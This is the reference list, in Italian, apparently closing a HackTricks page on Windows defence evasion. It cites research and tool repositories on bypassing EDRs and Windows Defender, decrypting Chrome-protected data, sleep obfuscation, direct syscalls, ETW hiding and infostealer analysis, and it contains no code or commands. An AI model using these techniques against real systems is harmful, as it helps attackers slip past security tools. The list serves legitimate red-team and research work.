- [20] [Zero Salarium – Contrastare gli EDR con il supporto del Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Rompere la shell protettiva di Windows Defender con la tecnica del folder redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento al comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sta arrivando in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – decrittografia di Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: sconfiggere il malware Node.js con API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: mettere Adaptix a nanna con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET e Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento della sleep con Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusare di Chrome Remote Desktop nelle operazioni di Red Team: una guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: weaponization del remediation driver di Defender come primitiva per operazioni kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
